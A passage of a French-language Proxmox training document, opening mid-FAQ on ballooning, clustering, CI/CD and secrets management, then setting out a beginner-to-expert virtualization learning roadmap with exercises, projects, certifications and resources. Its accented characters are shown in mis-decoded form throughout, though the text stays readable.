R: Le ballooning peut Ãªtre dÃ©sactivÃ©, la VM peut avoir des fuites mÃ©moire, le cache systÃ¨me consomme de la RAM, ou l'overcommit est mal configurÃ©. Surveillez l'utilisation rÃ©elle vs allouÃ©e et ajustez les paramÃ¨tres de ballooning.

## Questions Haute DisponibilitÃ©

**Q: Comment configurer un cluster Proxmox simple ?**
R: Minimum 3 nÅ“uds pour Ã©viter le split-brain, rÃ©seau dÃ©diÃ© pour le cluster, stockage partagÃ© (Ceph ou NFS), configuration identique des nÅ“uds. Utilisez `pvecm create` sur le premier nÅ“ud, puis `pvecm add` sur les autres. Testez le failover avant la production.

**Q: Que faire en cas de split-brain dans mon cluster ?**
R: Identifiez le nÅ“ud avec les donnÃ©es les plus rÃ©centes, arrÃªtez les nÅ“uds en minoritÃ©, corrigez le problÃ¨me rÃ©seau, redÃ©marrez les nÅ“uds un par un. PrÃ©venez avec un nombre impair de nÅ“uds et des liens rÃ©seau redondants.

**Q: Comment planifier la maintenance d'un cluster ?**
R: Migrez les VMs vers d'autres nÅ“uds, mettez le nÅ“ud en mode maintenance, effectuez les mises Ã  jour, testez le fonctionnement, remettez en service. Planifiez pendant les heures creuses et communiquez avec les utilisateurs.

## Questions DevOps

**Q: Comment automatiser le dÃ©ploiement de VMs ?**
R: Utilisez Terraform pour l'infrastructure, Ansible pour la configuration, crÃ©ez des templates standardisÃ©s, implÃ©mentez des pipelines CI/CD, utilisez cloud-init pour l'initialisation automatique. Versionnez vos configurations et testez en environnement de dÃ©veloppement.

**Q: Comment intÃ©grer Proxmox dans mes pipelines CI/CD ?**
R: Utilisez l'API Proxmox, crÃ©ez des VMs temporaires pour les tests, automatisez le nettoyage aprÃ¨s les builds, configurez des environnements Ã©phÃ©mÃ¨res, surveillez l'utilisation des ressources. ConsidÃ©rez des solutions comme GitLab Runner avec exÃ©cuteur shell.

**Q: Comment gÃ©rer les secrets dans mon infrastructure virtualisÃ©e ?**
R: Utilisez HashiCorp Vault ou Ansible Vault, chiffrez les donnÃ©es sensibles, implÃ©mentez la rotation automatique, limitez l'accÃ¨s selon le principe du moindre privilÃ¨ge, auditez l'utilisation des secrets. Ne stockez jamais de secrets en clair dans les configurations.

---

# Feuille de Route d'Apprentissage

## Niveau DÃ©butant (0-3 mois)

### Objectifs
- Comprendre les concepts fondamentaux de la virtualisation
- Installer et configurer un environnement Proxmox de base
- CrÃ©er et gÃ©rer des VMs simples
- MaÃ®triser les bases du rÃ©seau virtuel

### PrÃ©requis
- Connaissances Linux de base (ligne de commande, Ã©diteurs de texte)
- Notions rÃ©seau fondamentales (IP, masques de sous-rÃ©seau, routage)
- AccÃ¨s Ã  un serveur physique ou VM pour les tests

### Semaine 1-2 : Fondamentaux
**ThÃ©orie (10h) :**
- Module 1 : Bases Hardware (CPU, RAM, stockage, rÃ©seau)
- Comprendre la diffÃ©rence entre virtualisation et conteneurisation
- Ã‰tudier les types d'hyperviseurs et leurs cas d'usage

**Pratique (15h) :**
- Installation Proxmox VE sur serveur de test
- Configuration rÃ©seau de base (vmbr0)
- CrÃ©ation premiÃ¨re VM Ubuntu Server
- Exploration interface web Proxmox

**Exercices :**
1. Installer Proxmox sur un serveur physique ou VM imbriquÃ©e
2. CrÃ©er 3 VMs avec diffÃ©rents OS (Ubuntu, CentOS, Windows)
3. Configurer l'accÃ¨s SSH aux VMs Linux
4. Documenter la topologie rÃ©seau crÃ©Ã©e

### Semaine 3-4 : Virtualisation de base
**ThÃ©orie (8h) :**
- Module 2 : Virtualisation (KVM, conteneurs LXC)
- Comprendre les drivers VirtIO et leur importance
- Ã‰tudier la gestion des ressources (CPU, RAM, stockage)

**Pratique (20h) :**
- Optimisation des VMs (VirtIO, ballooning)
- CrÃ©ation et gestion de templates
- Snapshots et sauvegardes
- Conteneurs LXC vs VMs

**Exercices :**
1. CrÃ©er un template Ubuntu optimisÃ© avec VirtIO
2. DÃ©ployer 5 VMs Ã  partir du template
3. Configurer le ballooning mÃ©moire
4. CrÃ©er un conteneur LXC et comparer avec une VM Ã©quivalente

### Semaine 5-6 : RÃ©seau virtuel
**ThÃ©orie (8h) :**
- Module 3 : RÃ©seau virtuel (bridges, VLANs)
- Comprendre les concepts de segmentation rÃ©seau
- Ã‰tudier les protocoles rÃ©seau dans la virtualisation

**Pratique (20h) :**
- Configuration VLANs sur Proxmox
- CrÃ©ation de rÃ©seaux isolÃ©s
- Tests de connectivitÃ© inter-VMs
- Configuration firewall de base

**Exercices :**
1. CrÃ©er 3 VLANs (DMZ, LAN, MGMT)
2. DÃ©ployer des VMs dans chaque VLAN
3. Configurer les rÃ¨gles de firewall entre VLANs
4. Tester la connectivitÃ© et l'isolation

### Semaine 7-8 : Stockage
**ThÃ©orie (6h) :**
- Module 4 : Stockage (local, LVM, ZFS)
- Comprendre les diffÃ©rents types de stockage
- Ã‰tudier les concepts de performance et redondance

**Pratique (18h) :**
- Configuration stockage LVM-Thin
- Tests de performance disque
- Gestion des snapshots
- Migration de stockage

**Exercices :**
1. Configurer un pool de stockage LVM-Thin
2. CrÃ©er des snapshots avant/aprÃ¨s modifications
3. Migrer une VM entre diffÃ©rents stockages
4. Mesurer les performances avec fio

### Semaine 9-12 : Consolidation et projets
**Projets pratiques (40h) :**

**Projet 1 : Infrastructure web simple**
- DÃ©ployer un serveur web (Apache/Nginx)
- Configurer une base de donnÃ©es (MySQL/PostgreSQL)
- Mettre en place un reverse proxy
- Documenter l'architecture

**Projet 2 : Environnement de dÃ©veloppement**
- CrÃ©er des VMs pour diffÃ©rents environnements (dev, test, staging)
- Automatiser le dÃ©ploiement avec des scripts
- Configurer la sauvegarde automatique
- ImplÃ©menter la surveillance de base

**Ã‰valuation :**
- Quiz de fin de niveau (50 questions)
- PrÃ©sentation d'un projet personnel
- DÃ©monstration pratique des compÃ©tences acquises

---

## Niveau IntermÃ©diaire (3-8 mois)

### Objectifs
- MaÃ®triser la haute disponibilitÃ© et le clustering
- Automatiser l'infrastructure avec IaC
- ImplÃ©menter des solutions de monitoring avancÃ©es
- Comprendre les concepts DevOps appliquÃ©s Ã  la virtualisation

### PrÃ©requis
- MaÃ®trise du niveau dÃ©butant
- Connaissances rÃ©seau avancÃ©es (routage, VPN)
- Bases de programmation (Python, Bash)
- ComprÃ©hension des concepts DevOps

### Mois 1 : Haute disponibilitÃ©
**ThÃ©orie (15h) :**
- Module 5 : Haute disponibilitÃ© et clustering
- Ã‰tudier les architectures redondantes
- Comprendre les concepts de failover et load balancing

**Pratique (35h) :**
- Configuration cluster Proxmox 3 nÅ“uds
- DÃ©ploiement Ceph pour stockage distribuÃ©
- Tests de failover et rÃ©cupÃ©ration
- Optimisation des performances cluster

**Exercices :**
1. DÃ©ployer un cluster Proxmox 3 nÅ“uds
2. Configurer Ceph avec rÃ©plication 3x
3. Tester le failover automatique des VMs
4. ImplÃ©menter la surveillance du cluster

### Mois 2 : Automatisation et IaC
**ThÃ©orie (12h) :**
- Module 6 : Infrastructure as Code
- Ã‰tudier Terraform et Ansible
- Comprendre les pipelines CI/CD

**Pratique (40h) :**
- Automatisation avec Terraform
- Configuration avec Ansible
- CrÃ©ation de pipelines GitLab CI/CD
- Gestion des secrets avec Vault

**Exercices :**
1. Automatiser le dÃ©ploiement d'infrastructure avec Terraform
2. Configurer des VMs avec Ansible playbooks
3. CrÃ©er un pipeline CI/CD complet
4. ImplÃ©menter la gestion sÃ©curisÃ©e des secrets

### Mois 3 : Conteneurs et orchestration
**ThÃ©orie (12h) :**
- Kubernetes sur infrastructure virtualisÃ©e
- Comprendre l'orchestration de conteneurs
- Ã‰tudier les patterns microservices

**Pratique (40h) :**
- DÃ©ploiement cluster Kubernetes sur VMs
- Configuration stockage persistant avec Ceph CSI
- DÃ©ploiement d'applications microservices
- Monitoring avec Prometheus et Grafana

**Exercices :**
1. DÃ©ployer un cluster Kubernetes sur VMs Proxmox
2. Configurer le stockage persistant avec Ceph
3. DÃ©ployer une application microservices complÃ¨te
4. ImplÃ©menter le monitoring et l'observabilitÃ©

### Mois 4 : SÃ©curitÃ© avancÃ©e
**ThÃ©orie (15h) :**
- Module 7 : CybersÃ©curitÃ©
- Ã‰tudier la segmentation rÃ©seau avancÃ©e
- Comprendre les concepts Zero Trust

**Pratique (35h) :**
- Configuration DMZ multicouche
- DÃ©ploiement de bastions sÃ©curisÃ©s
- ImplÃ©mentation de la segmentation rÃ©seau
- Configuration SIEM avec ELK Stack

**Exercices :**
1. CrÃ©er une architecture DMZ complÃ¨te
2. Configurer des bastions avec accÃ¨s contrÃ´lÃ©
3. ImplÃ©menter la segmentation rÃ©seau avec pfSense
4. DÃ©ployer un SIEM centralisÃ©

### Mois 5 : Projets avancÃ©s
**Projets complexes (50h) :**

**Projet 1 : Infrastructure e-commerce**
- Architecture haute disponibilitÃ© complÃ¨te
- Load balancing et CDN
- Base de donnÃ©es distribuÃ©e
- Monitoring et alerting avancÃ©s

**Projet 2 : Plateforme DevOps**
- Environnements automatisÃ©s (dev/test/prod)
- Pipelines CI/CD avec tests automatisÃ©s
- DÃ©ploiement blue-green
- Rollback automatique

**Certification :**
- PrÃ©paration certification Proxmox (PCSA)
- Examen pratique complet
- Projet de fin de formation

---

## Niveau Expert (8+ mois)

### Objectifs
- Architecturer des solutions complexes multi-sites
- Optimiser les performances Ã  grande Ã©chelle
- ImplÃ©menter des solutions de sÃ©curitÃ© avancÃ©es
- Devenir autonome sur les technologies Ã©mergentes

### PrÃ©requis
- MaÃ®trise complÃ¨te du niveau intermÃ©diaire
- ExpÃ©rience pratique sur projets rÃ©els
- Connaissances approfondies en sÃ©curitÃ©
- CompÃ©tences en programmation avancÃ©es

### SpÃ©cialisations possibles

#### SpÃ©cialisation 1 : Architecte Infrastructure
**CompÃ©tences dÃ©veloppÃ©es :**
- Conception d'architectures multi-sites
- Optimisation des performances Ã  grande Ã©chelle
- Planification de capacitÃ© avancÃ©e
- Gestion des coÃ»ts et ROI

**Projets types :**
- Infrastructure cloud hybride
- Migration datacenter complexe
- Architecture disaster recovery
- Optimisation Ã©nergÃ©tique

#### SpÃ©cialisation 2 : Expert SÃ©curitÃ©
**CompÃ©tences dÃ©veloppÃ©es :**
- Architectures Zero Trust avancÃ©es
- Forensics et incident response
- Compliance et audit
- Threat hunting automatisÃ©

**Projets types :**
- SOC (Security Operations Center)
- Infrastructure de test de pÃ©nÃ©tration
- SystÃ¨me de dÃ©tection avancÃ©
- Compliance multi-rÃ©glementaire

#### SpÃ©cialisation 3 : DevOps/SRE
**CompÃ©tences dÃ©veloppÃ©es :**
- ObservabilitÃ© avancÃ©e
- Chaos engineering
- Automatisation complÃ¨te
- Performance engineering

**Projets types :**
- Plateforme CI/CD enterprise
- Infrastructure as Code avancÃ©e
- Monitoring prÃ©dictif
- Auto-scaling intelligent

### Formation continue
- Veille technologique constante
- Participation Ã  des confÃ©rences (KubeCon, VMworld)
- Contribution Ã  des projets open-source
- Mentoring d'Ã©quipes junior

### Certifications recommandÃ©es
- Proxmox Certified Specialist Advanced (PCSA)
- VMware VCP/VCAP selon environnement
- Kubernetes CKA/CKAD/CKS
- Cloud provider certifications (AWS, Azure, GCP)
- Certifications sÃ©curitÃ© (CISSP, CISM)

---

## Ressources d'Apprentissage

### Documentation officielle
- [Proxmox VE Documentation](https://pve.proxmox.com/wiki/Main_Page)
- [KVM Documentation](https://www.linux-kvm.org/page/Documents)
- [Ceph Documentation](https://docs.ceph.com/)
- [Kubernetes Documentation](https://kubernetes.io/docs/)

### Livres recommandÃ©s
- "Mastering Proxmox" par Wasim Ahmed
- "Kubernetes in Action" par Marko LukÅ¡a
- "Infrastructure as Code" par Kief Morris
- "Site Reliability Engineering" par Google

### Formations en ligne
- Proxmox Training (officiel)
- Linux Academy / A Cloud Guru
- Udemy courses sur la virtualisation
- Coursera spÃ©cialisations DevOps

### Laboratoires pratiques
- EVE-NG pour la simulation rÃ©seau
- GNS3 pour les topologies complexes
- Vagrant pour l'automatisation
- Homelab personnel recommandÃ©

### CommunautÃ©s
- Forum Proxmox officiel
- Reddit r/Proxmox, r/homelab
- Discord/Slack communautÃ©s DevOps
- Meetups locaux virtualisation/cloud

Cette feuille de route est adaptable selon votre rythme d'apprentissage et vos objectifs professionnels. L'important est la pratique rÃ©guliÃ¨re et l'application des concepts sur des projets rÃ©els.

---

